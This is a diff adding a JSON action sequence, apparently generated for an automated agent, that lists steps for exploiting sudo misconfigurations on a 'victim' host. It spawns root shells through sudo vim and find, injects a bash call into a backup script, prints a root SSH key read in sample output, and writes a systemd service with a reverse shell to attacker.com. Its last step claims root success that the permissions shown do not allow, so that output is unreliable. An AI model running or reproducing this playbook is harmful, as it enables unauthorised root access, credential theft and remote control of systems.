@@ -1,0 +1,30 @@
+{
+  "name": "sudo_misconfiguration_abuse",
+  "description": "Identify and exploit sudo misconfigurations for privilege escalation",
+  "pattern": "sudo.*exploit|sudo.*privesc|sudoers.*abuse|sudo.*nopasswd",
+  "parameters": [],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sudo", "args": ["-l"]},
+      "expected_output": {"type": "string", "example": "Matching Defaults entries for user on victim:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nUser user may run the following commands on victim:\n    (root) NOPASSWD: /usr/bin/vim\n    (root) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /bin/systemctl restart apache2\n    (admin) /usr/bin/python3 /opt/scripts/backup.py\n\nSudo rights discovered - can run vim, find, systemctl as root without password"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sudo", "args": ["vim", "-c", ":!sh"]},
+      "expected_output": {"type": "string", "example": "Opening vim with shell command execution\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n\n# whoami\nroot\n\n# cat /root/.ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3vK8...\n-----END RSA PRIVATE KEY-----\n\nRoot shell obtained via sudo vim exploitation"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'import os; os.system(\"/bin/bash\")' >> /opt/scripts/backup.py && sudo -u admin /usr/bin/python3 /opt/scripts/backup.py"]},
+      "expected_output": {"type": "string", "example": "Injecting malicious code into backup.py\n\nadmin@victim:~$ id\nuid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)\n\nadmin@victim:~$ sudo su\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nEscalated to admin user, then used admin's sudo privileges for root"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "sudo find /dev/null -exec /bin/sh \\;"]},
+      "expected_output": {"type": "string", "example": "Exploiting sudo find with -exec\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n\n# ls -la /root\ntotal 48\ndrwx------  5 root root 4096 Jan 15 10:45 .\ndrwxr-xr-x 24 root root 4096 Jan 10 14:22 ..\n-rw-------  1 root root  157 Jan 15 09:30 .bash_history\n-rw-r--r--  1 root root   33 Jan 10 12:00 root.txt\n\nRoot access via sudo find -exec"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "sudo systemctl restart apache2 &disown && echo '[Service]' > /tmp/shell.service && echo 'ExecStart=/bin/bash -c \"/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\"' >> /tmp/shell.service"]},
+      "expected_output": {"type": "string", "example": "Apache2 restart allowed - testing systemctl abuse\n\nCreated malicious service file:\n[Service]\nExecStart=/bin/bash -c \"/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\"\n\nAttempting to exploit systemctl:\nsudo systemctl link /tmp/shell.service\nsudo systemctl start shell.service\n\nReverse shell spawned as root to attacker.com:4444"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
